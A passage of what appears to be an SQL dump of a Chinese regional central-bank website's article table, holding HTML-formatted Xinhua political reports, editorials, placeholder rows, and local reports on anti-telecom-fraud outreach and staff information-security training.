style=\"color:navy\">王沪宁代表党中央致词</span></span></p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　新华社北京10月22日电（记者赵超、齐中熙）中国工会第十七次全国代表大会22日上午在人民大会堂开幕。习近平、李克强、栗战书、汪洋、赵乐际、韩正等党和国家领导人到会祝贺，王沪宁代表党中央致词。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　人民大会堂大礼堂气氛庄重热烈。主席台上方悬挂着“中国工会第十七次全国代表大会”的会标，后幕正中象征着中国工会和中国工人阶级团结统一的工会会徽熠熠生辉，10面鲜艳的红旗分列两侧。二楼眺台悬挂着“高举习近平新时代中国特色社会主义思想伟大旗帜，坚持走中国特色社会主义工会发展道路，团结动员亿万职工为决胜全面建成小康社会、实现中华民族伟大复兴的中国梦而奋斗！”的巨型横幅。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　承载着亿万职工的重托，来自全国各行各业的2000多名中国工会十七大代表和近百名特邀代表出席盛会。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　上午9时30分，中共中央总书记、国家主席、中央军委主席习近平等步入会场，全场响起热烈的掌声。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　大会主席团常务主席王东明宣布大会开幕。全体起立，高唱国歌。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　王沪宁代表党中央发表了题为《展示新时代我国工人阶级团结奋斗新风采》的致词。王沪宁首先向大会的召开表示热烈祝贺，向全国各族职工和工会干部致以诚挚的问候。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　王沪宁在致词中说，党的十八大以来，在以习近平同志为核心的党中央坚强领导下，我国工人阶级以高度的主人翁使命感和历史责任感，积极投身进行伟大斗争、建设伟大工程、推进伟大事业、实现伟大梦想的火热实践。中国工会十六大以来，各级工会坚持以习近平新时代中国特色社会主义思想为指导，组织动员职工建功立业，推动构建和谐劳动关系，推进产业工人队伍建设改革，深化工会改革创新，各项工作取得重要进展，工会组织和工会工作政治性、先进性、群众性显著增强。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　王沪宁表示，习近平总书记关于工人阶级和工会工作的重要论述，为新时代工运事业和工会工作创新发展指明了前进方向。实现党的十九大提出的宏伟蓝图，是全党全国各族人民的共同任务，更是我国工人阶级的历史使命。希望我国工人阶级把思想和行动统一到党的十九大精神上来，坚守理想信念，弘扬民族精神，激发劳动热情，矢志改革创新，练就过硬本领，唱响新时代奋斗者之歌。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　共青团中央书记处第一书记贺军科，中央军委委员、中央军委政治工作部主任苗华，先后代表人民团体和解放军、武警部队向大会致贺词。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　王东明代表中华全国总工会第十六届执行委员会作了题为《以习近平新时代中国特色社会主义思想为指导　团结动员亿万职工为决胜全面建成小康社会　夺取新时代中国特色社会主义伟大胜利而奋斗》的报告。报告分为3个部分：过去五年工会工作的重点成就；深入学习贯彻习近平新时代中国特色社会主义思想，坚定不移走中国特色社会主义工会发展道路；今后五年工会工作的主要任务。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　大会以书面报告的形式向代表提交了《中国工会章程（修正案）》、《中华全国总工会第十六届执行委员会财务工作报告》、《中华全国总工会第十六届经费审查委员会工作报告》，请代表审议。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　中共中央书记处书记，全国人大常委会、国务院、全国政协、中央军委有关领导同志出席会议。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\">　　中央和国家机关有关部门、解放军和武警部队、各民主党派中央、全国工商联负责人和无党派人士代表，各人民团体、北京市负责同志，香港、澳门特别行政区工会界的朋友，首都各界职工代表参加了开幕式。</p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\"><span style=\"font-weight: 600 !important;\"><span style=\"color:navy\">　　相关新闻：</span></span></p><p style=\"margin-top: 0px; margin-bottom: 15px; padding: 0px; color: rgb(64, 64, 64); font-family: \" pingfang=\"\" lantinghei=\"\" helvetica=\"\" microsoft=\"\" wenquanyi=\"\" zen=\"\" micro=\"\" font-size:=\"\" white-space:=\"\"><a href=\"http://www.xinhuanet.com/politics/2018-10/21/c_1123589652.htm\" target=\"_blank\" style=\"text-decoration-line: none; outline: none; color: rgb(51, 51, 51);\"><span style=\"font-weight: 600 !important;\"><span style=\"color:navy\">　　在新时代党的真挚关怀下不断奋进——习近平总书记关心工人阶级和工会工作纪实</span></span></a></p><p><br/></p>', null, null, null), ('148', '<p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">10月20日，习近平总书记在给“万企帮万村”行动中受表彰的民营企业家的回信中，充分肯定了改革开放以来民营企业取得的巨大成就以及为国民经济作出的突出历史贡献，重申了党中央毫不动摇支持民营企业发展的一贯立场。总书记的回信，为新时代中国民营企业繁荣发展注入了强大的信心和动力。</p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;\"><img src=\"/honghe/u/cms/www/201810/22172552n4ax.jpg\" alt=\" \" width=\"500\" isflag=\"1\" style=\"margin: 0px 0px -13px; padding: 0px; border: 0px none; width: 630px; max-width: 630px;\"/></p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">　　改革开放40年来，中国民营企业栉风沐雨、敢闯敢干，从小到大、由弱变强，谱写了光辉澎湃的艰苦创业史。作为中国特色社会主义的建设者，民营经济人士创造了我国60%以上的GDP，缴纳了50%以上的税收，贡献了70%以上的技术创新和新产品开发，提供了80%以上的就业岗位。可以说，民营企业始终是稳定经济的重要基础，是国家税收的重要来源，是技术创新的重要主体，是经济持续健康发展的重要力量。</p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">　　党的十八大以来，以习近平同志为核心的党中央高度重视民营经济发展，从两个“毫不动摇”，到三个“没有变”，再到“对非公有制经济人士多关注、多谈心、多引导，帮助解决实际困难”，多次强调要促进民营经济健康发展，改善民营企业经营环境、不断激发民营企业的活力和创造力。</p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;\"><img src=\"/honghe/u/cms/www/201810/221725523yg6.jpg\" alt=\" \" width=\"500\" isflag=\"1\" style=\"margin: 0px 0px -13px; padding: 0px; border: 0px none; width: 630px; max-width: 630px;\"/></p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">　　在这次回信中，习近平总书记希望广大民营企业家把握时代大势，坚定发展信心，心无旁骛创新创造，踏踏实实办好企业，合力开创民营经济更加美好的明天，为实现中华民族伟大复兴的中国梦作出新的更大贡献。广大民营企业要将总书记的殷殷嘱托和亲切关怀化为持续奋进的动力，进一步保持效力、释放活力，与公有制经济紧密配合、协调共振，推动新时代中国特色社会主义经济行稳致远。</p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">　　奋进正当时，创新天地宽。民营企业要抓住新时代的发展机遇，充分发挥经营多元、管理灵活的优势，攻坚新技术、发展新业态、研发新产品，在关键技术、前沿领域方面打破封锁、有所突破，努力形成新的核心竞争力。责任呼唤担当，使命引领未来。作为巨大的“就业容纳器”，民营经济创造了大量的就业岗位，今后要继续深化改革，将社会生产力的进一步解放和质量提升转化为实实在在的人民福祉。</p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;\"><img src=\"/honghe/u/cms/www/201810/22172552uh8y.jpg\" alt=\" \" width=\"500\" isflag=\"1\" style=\"margin: 0px 0px -13px; padding: 0px; border: 0px none; width: 630px; max-width: 630px;\"/></p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">　　习近平总书记强调，民营经济的历史贡献不可磨灭，民营经济的地位作用不容置疑，任何否定、弱化民营经济的言论和做法都是错误的。支持民营企业发展，是党中央的一贯方针，这一点丝毫不会动摇。面对近来“让民营经济离场”等奇谈怪论，我们既要理直气壮予以驳斥，坚决抵制这种开历史倒车、一叶障目的短视行为，让民营企业经营者安下心来，心无旁骛创新创造，踏踏实实办好企业；又要在实际工作中将民营经济发展摆在更加突出的位置，思想再解放，改革再深入，工作再抓实，为市场主体提供更公平的创新发展土壤，持续激发民营经济活力。</p><p style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 18px; line-height: 42px; font-family: &quot;microsoft yahei&quot;; white-space: normal; background-color: rgb(255, 255, 255);\">　　全社会要深刻领会习近平总书记关于发展民营经济的重要指示，以制度呵护，用信心浇灌，为民营企业发展创造更加健康的环境，开创中国经济更加美好的明天。</p><p><br/></p>', null, null, null), ('149', '<p style=\"white-space: normal; border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; padding: 0px; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; caret-color: rgb(25, 25, 25); color: rgb(25, 25, 25); font-family: \" pingfang=\"\">10月18日，国家主席习近平向“一带一路”能源部长会议和国际能源变革论坛致贺信。习近平主席在贺信中强调，能源合作是共建“一带一路”的重点领域。我们愿同各国在共建“一带一路”框架内加强能源领域合作，为推动共同发展创造有利条件，共同促进全球能源可持续发展，维护全球能源安全。&nbsp;</p><table><tbody style=\"margin: 0px; padding: 0px;\"><tr style=\"margin: 0px; padding: 0px;\" class=\"firstRow\"><td style=\"padding: 9px 15px; margin: 0px; font-size: 14px; background-color: rgb(248, 247, 243); line-height: 26px;\"><p style=\"text-align:center;border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0;\"><img src=\"/honghe/u/cms/www/201810/19204743xoao.jpeg\" width=\"500\" height=\"287\" style=\"border: 0px; margin: 10px auto 0px; padding: 0px; display: block; max-width: 100%; height: auto;\"/></p></td></tr></tbody></table><p style=\"white-space: normal; border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; padding: 0px; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; caret-color: rgb(25, 25, 25); color: rgb(25, 25, 25); font-family: \" pingfang=\"\">习主席的贺信，高度肯定了“一带一路”倡议实施5年来的丰硕成果，表达了中国愿同各方携手开创“一带一路”能源合作新局面的诚意，充分彰显出中国作为负责任大国共同促进全球能源可持续发展的使命担当，对于推动“一带一路”继续走深走实，推动构建人类命运共同体具有深远的时代意义。&nbsp;</p><p style=\"white-space: normal; border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; padding: 0px; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; caret-color: rgb(25, 25, 25); color: rgb(25, 25, 25); font-family: \" pingfang=\"\">春华秋实五载过，携手共进著华章。5年来，“一带一路”沿线能源合作深入推进，100余份合作文件、20多项双边合作机制、国与国之间联合规划研究推动着“一带一路”能源合作领域不断扩展、规模不断扩大、质量不断提高。绵延近6000公里的中俄东线天然气项目宛如一条巨龙，穿梭于东北亚大陆；坐落于阿拉伯海滨的中国电建达沃风电场犹如一颗明珠，照亮中巴经济走廊；中亚天然气管道、中哈原油管道、中缅油气管道等油气输送通道形成了联通中外、惠及多国的油气供应和市场网络……一个个互惠互利的能源项目落地生根、开花结果，能源合作正成为推动“一带一路”沿线国家深化合作发展，搭建互通桥梁的重要平台。&nbsp;</p><table><tbody style=\"margin: 0px; padding: 0px;\"><tr style=\"margin: 0px; padding: 0px;\" class=\"firstRow\"><td style=\"padding: 9px 15px; margin: 0px; font-size: 14px; background-color: rgb(248, 247, 243); line-height: 26px;\"><p style=\"text-align:center;border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0;\"><img src=\"/honghe/u/cms/www/201810/19204743kh8m.jpeg\" width=\"500\" height=\"287\" style=\"border: 0px; margin: 10px auto 0px; padding: 0px; display: block; max-width: 100%; height: auto;\"/></p></td></tr></tbody></table><p style=\"white-space: normal; border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; padding: 0px; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; caret-color: rgb(25, 25, 25); color: rgb(25, 25, 25); font-family: \" pingfang=\"\">志合者，不以山海为远。当前，世界能源形势正发生复杂而深刻的变化，新一轮能源科技革命加速推进，应对全球能源安全和可持续发展问题迫在眉睫，亟需各国凝聚共识、深入交流、携手应对。“一带一路”沿线国家能源合作具有很强的互补性，是优化能源结构、平衡禀赋差异的重要途径，既可解部分地区能源匮乏之困，又能打通制约经济发展的瓶颈。只要“一带一路”沿线国家携起手来，精诚合作，就一定能够带动更大范围、更高水平、更深层次的区域合作，为促进全球能源可持续发展，维护全球能源安全，繁荣全球经济发展注入强劲动力。&nbsp;</p><p style=\"white-space: normal; border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; padding: 0px; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; caret-color: rgb(25, 25, 25); color: rgb(25, 25, 25); font-family: \" pingfang=\"\">作为人类社会发展的重要物质基础，能源更攸关各国国计民生。“一带一路”沿线国家大多数是发展中国家，正处于城市化、工业化进程中，能源供应问题特别是电能不足，极大限制了其社会经济发展，困扰了其人民日常生活。能源领域合作实现了“一带一路”沿线国家资源优化、机遇共享，把各国自身发展优势转化为沿线国家共同发展优势，既释放了各国发展红利，又补足了各国发展短板，实现了构建开放包容、普惠共享的能源利益共同体、责任共同体和命运共同体的美好蓝图。&nbsp;</p><table><tbody style=\"margin: 0px; padding: 0px;\"><tr style=\"margin: 0px; padding: 0px;\" class=\"firstRow\"><td style=\"padding: 9px 15px; margin: 0px; font-size: 14px; background-color: rgb(248, 247, 243); line-height: 26px;\"><p style=\"text-align:center;border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0;\"><img src=\"/honghe/u/cms/www/201810/19204743l2ux.jpeg\" width=\"500\" height=\"287\" style=\"border: 0px; margin: 10px auto 0px; padding: 0px; display: block; max-width: 100%; height: auto;\"/></p></td></tr></tbody></table><p style=\"white-space: normal; border: 0px; margin-top: 0.63em; margin-bottom: 1.8em; padding: 0px; counter-reset: list-1 0 list-2 0 list-3 0 list-4 0 list-5 0 list-6 0 list-7 0 list-8 0 list-9 0; caret-color: rgb(25, 25, 25); color: rgb(25, 25, 25); font-family: \" pingfang=\"\">百舸争流千帆竞，乘风破浪正远航。“一带一路”倡议饱含着历史与现实的“优美韵律”，承载着沿线各国人民的共同梦想，已经成为越来越多国家和地区的共识。我们要深刻领会习近平主席的贺信精神，以“一带一路”能源部长会议和国际能源变革论坛为契机，坚持共商、共建、共享，积极推进“一带一路”能源合作的行动路线图，让“一带一路”能源合作走深走实，为维护全球能源安全做出更大贡献！</p><p><br/></p>', null, null, null), ('160', '<p>图片新闻图片新闻图片新闻图片新闻</p>', null, null, null), ('161', '<p>图片新闻</p>', null, null, null), ('162', '<p>图片新闻</p>', null, null, null), ('163', '<p>综合文档1</p>', null, null, null), ('164', '<p>综合文档2</p>', null, null, null), ('165', '<p>综合文档3</p>', null, null, null), ('166', '<p>综合文档4</p>', null, null, null), ('167', '<p>综合文档5</p>', null, null, null), ('168', '<p>综合文档5</p>', null, null, null), ('169', '<p>综合文档7</p>', null, null, null), ('170', '<p>综合文档7</p>', null, null, null), ('171', '<p>综合文档9</p>', null, null, null), ('172', '<p>综合文档7</p>', null, null, null), ('173', '<p><span style=\"font-family: \" microsoft=\"\" font-size:=\"\" background-color:=\"\">&nbsp; 为落实贯彻好《中国人民银行关于加强支付结算管理防范电信网络新型违法犯罪有关事项的通知》、《中国人民银行关于进一步加强银行卡风险管理的通知》的文件精神，在3.15消费者权益保护日来临之际，石屏支行工作人员奔赴石屏宝秀镇，联合当地信用社网点，利用赶集日开展了“加强信息保护和支付安全，防范电信网络诈骗”为主题的宣传活动。</span><br style=\"font-family: \" microsoft=\"\" font-size:=\"\" white-space:=\"\" background-color:=\"\"/><span style=\"font-family: \" microsoft=\"\" font-size:=\"\" background-color:=\"\">&nbsp;&nbsp;&nbsp;&nbsp;活动中，石屏支行工作人员通过张贴和现场讲解《关于防范和打击电信网络诈骗犯罪的通告》内容，向赶集百姓宣传防范电信诈骗知识，并接受群众提问，揭露电信诈骗犯罪伎俩，提醒群众防范犯罪分子可能利用电话、网络等媒介编造种种理由、设置重重陷阱，诱骗群众进行银行卡转账，骗取群众钱财，并告知群众不要向陌生人透露自己的身份信息、银行卡密码等重要内容。本次活动共向群众散发宣传传单、折页2000余份。</span><br style=\"font-family: \" microsoft=\"\" font-size:=\"\" white-space:=\"\" background-color:=\"\"/><span style=\"font-family: \" microsoft=\"\" font-size:=\"\" background-color:=\"\">&nbsp;&nbsp;&nbsp;&nbsp;防范电信网络诈骗任重而道远，石屏支行不断加强与推进防范电信网络诈骗知识的宣传普及，切实提升群众防范金融风险能力，为百姓营造良好的金融环境，保护群众的合法权益。</span><br style=\"font-family: \" microsoft=\"\" font-size:=\"\" white-space:=\"\" background-color:=\"\"/><br style=\"font-family: \" microsoft=\"\" font-size:=\"\" white-space:=\"\" background-color:=\"\"/><span style=\"font-family: \" microsoft=\"\" font-size:=\"\" background-color:=\"\">&nbsp;&nbsp;&nbsp;&nbsp;批准：杨燕屏&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编辑：张祺</span></p>', null, null, null), ('174', '<p>&nbsp; &nbsp; &nbsp;时值2017年“国际消费者权益日”到来之际，3月14日人行建水县支行联合中行建水县支行、建水县农村信用合作联社来到建水县青龙镇进行宣传。</p><p>&nbsp; &nbsp; 这次宣传活动恰巧赶上青龙镇赶集的日子，宣传者们利用赶集日到当地农信社办理业务的人流量较大的情况，向过往群众发放宣传资料。</p><p>&nbsp; &nbsp; 现场活动中宣传人员通过发放折页，现场讲解等方式以案说案，解析案例，传授群众防骗措施，并通过实例让广大群众全面了解电信网络新型违法犯罪的手段变化和防范要点，坚决遏制电信网络新型违法犯罪。</p><p>&nbsp; &nbsp; 通过宣传活动，普及了公众安全支付知识，增强了公众群体安全防范意识，提升了群众自主识别诈骗能力，为营造更加和谐安全支付环境，有效防范电信网络新型违法犯罪起到了积极的宣传导向作用。</p><p><br/></p><p><br/></p><p>批准：杨碧&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;编辑：郭程远</p><p><br/></p>', null, null, null), ('175', '<p><br/></p><p>&nbsp; &nbsp; 阳春三月，春意盎然。人行开远支行联合曲靖市商业银行到开远市朋阳敬老院开展“加强信息保护和支付安全防范电信网络欺诈”宣传。宣传人员充分认识到老年人辨别能力差、防范意识薄弱的特点，重点对老人们讲解防范电信网络诈骗知识。提示老人、学生不要轻易泄露自己的个人信息和家庭信息，不能轻信陌生人的电话和短信，更不要轻易给陌生人汇款、转账。</p><p>&nbsp; &nbsp; 通过现场对防范电信网络欺诈知识的宣传，教给敬老院老人们提高防范意识的方法，提醒老人们保护自身财产。同时，向老人们详细讲解了如何识别新版佰元券，宣传人员还拿出了现钞进行演示；在支招如何防范电信诈骗时，大家听得津津有味。</p><p>&nbsp; &nbsp; &nbsp;</p><p>&nbsp; &nbsp; 批准：袁子亮&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;编辑：高榕</p><p><br/></p>', null, null, null), ('176', '<p><br/></p><p>&nbsp; &nbsp; 阳春三月，春意盎然。人行开远支行联合曲靖市商业银行到开远市朋阳敬老院开展“加强信息保护和支付安全防范电信网络欺诈”宣传。宣传人员充分认识到老年人辨别能力差、防范意识薄弱的特点，重点对老人们讲解防范电信网络诈骗知识。提示老人、学生不要轻易泄露自己的个人信息和家庭信息，不能轻信陌生人的电话和短信，更不要轻易给陌生人汇款、转账。</p><p>&nbsp; &nbsp; 通过现场对防范电信网络欺诈知识的宣传，教给敬老院老人们提高防范意识的方法，提醒老人们保护自身财产。同时，向老人们详细讲解了如何识别新版佰元券，宣传人员还拿出了现钞进行演示；在支招如何防范电信诈骗时，大家听得津津有味。</p><p>&nbsp; &nbsp; &nbsp;</p><p>&nbsp; &nbsp; 批准：袁子亮&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;编辑：高榕</p><p><br/></p>', null, null, null), ('177', '<p><br/></p><p>&nbsp; &nbsp; 为提高干部职工信息安全意识，确保支行网络安全、可靠、稳定运行，杜绝违规外联事件发生，结合当前正在开展的防范电信网络诈骗宣传活动，3月2日，人行石屏支行，组织全体干部职工开展了网络与信息安全知识专题培训。</p><p>&nbsp; &nbsp; 培训会上，科技人员首先围绕信息安全管理制度、信息安全工作职责分工、计算机涉密信息安全以及如何保障涉密信息安全等规章制度进行了讲解。其次向与会职工讲解了人民银行日常网络维护、病毒防范及信息安全保障的技术及措施，并要求全体职工积极配合科技人员做好日常的计算机安全防护，发现异常及时向科技人员报告。最后，结合目前正在开展的防范电信网络诈骗宣传活动，科技人员向全体职工讲解了新型电信网络诈骗的基本识别及应对措施。</p><p>&nbsp; &nbsp; 通过培训，有效强化了全行干部职工网络信息安全知识和信息安全意识，提高了网络信息安全防护水平。参训人员一致表示，在今后工作中，一定做到严格遵守相关网络安全规定，规范计算机应用，避免违规外联等网络违规事件发生。</p><p><br/></p><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;编辑：张祺&nbsp; &nbsp; 批准：孟干</p><p><br/></p>', null, null, null), ('178', '<p>&nbsp; &nbsp; 按照红河中支关于开展防电信网络诈骗宣传活动的工作要求，按照泸西支行制定的《中国人民银行泸西县支行“加强信息保护和支付安全防范电信网络欺诈”主题宣传工作方案》，2017年2月以来，人民银行泸西支行要求辖内各银行业金融机构要加大自身学习力度，同时加大营业网点的宣传力度。</p><p>&nbsp; &nbsp; 银行业金融机构工作人员，充分利用晚上集中学习的时间，加强对防范电信诈骗相关知识的学习，保证每位银行从业人员对电信诈骗相关知识能够充分了解，同时将防诈骗知识传导给各金融消费者，保证泸西县辖内金融消费者充分认识到诈骗活动的危害以及如何及时防范诈骗活动。</p><p>&nbsp; &nbsp; 各银行业金融机构按照人民银行泸西县支行的工作要求，及时在营业网点和自助设备点及时黏贴宣传海报，LED处及时进行宣传，保证泸西县市民能够及时对防范诈骗知识进行了解和学习。</p><p><br/></p><p>批准：赵贤&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;编辑：陈实&nbsp; &nbsp;&nbsp;</p><p><br/></p>', null, null, null), ('179', '<p><br/></p><p>&nbsp; &nbsp; 为提高干部职工信息安全意识，确保支行网络安全、可靠、稳定运行，杜绝违规外联事件发生，结合当前正在开展的防范电信网络诈骗宣传活动，3月2日，人行石屏支行，组织全体干部职工开展了网络与信息安全知识专题培训。</p><p>&nbsp; &nbsp; 培训会上，科技人员首先围绕信息安全管理制度、信息安全工作职责分工、计算机涉密信息安全以及如何保障涉密信息安全等规章制度进行了讲解。其次向与会职工讲解了人民银行日常网络维护、病毒防范及信息安全保障的技术及措施，并要求全体职工积极配合科技人员做好日常的计算机安全防护，发现异常及时向科技人员报告。最后，结合目前正在开展的防范电信网络诈骗宣传活动，科技人员向全体职工讲解了新型电信网络诈骗的基本识别及应对措施。</p><p>&nbsp; &nbsp; 通过培训，有效强化了全行干部职工网络信息安全知识和信息安全意识，提高了网络信息安全防护水平。参训人员一致表示，在今后工作中，一定做到严格遵守相关网络安全规定，规范计算机应用，避免违规外联等网络违规事件发生。</p><p><br/></p><p><br/></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;编辑：张祺&nbsp; &nbsp; 批准：孟干</p><p><br/></p>', null, null, null), ('180', '<p>各县（市）支行：</p><p><br/></p><p>&nbsp; &nbsp; 现将《中国人民银行办公厅关于做好2017年全国“两会”期间网络与信息系统安全保障工作的通知》（银办发[2017]39号，附件）转发给你们，并补充通知如下，请一并遵照执行：</p><p>&nbsp; &nbsp; 一、加强日常监测</p><p>&nbsp; &nbsp; 切实落实网络与信息安全保障措施，做好系统值班安排，加大技术检查频度，重点加强对重要系统和薄弱环节的监测。</p><p>&nbsp; &nbsp; 二、做好应急准备</p><p>&nbsp; &nbsp; 做好应急管理各项工作，进一步明确应急处置流程，完善控制机制，做好人力、技术和物资等各项应急资源的准备，强化应急协调管理，一旦发现事件苗头，应按流程及时报告，快速处置。</p><p>&nbsp; &nbsp; 三、明确责任</p><p>&nbsp; &nbsp; 各单位需明确责任领导和联络员，并于3月2日下班前将责任领导和联络员信息（包括姓名、部门、职务、办公电话、手机）发到联系人业务网邮箱。</p><p>&nbsp; &nbsp; 四、定期报送情况</p><p>&nbsp; &nbsp; 2017年3月3日至3月16日，各单位每日15:40前，通过业务网邮件报送前一天15:30至当日15:30的网络安全情况。</p><p><br/></p><p>&nbsp; &nbsp; 联 系 人：黄锦</p><p>&nbsp; &nbsp; 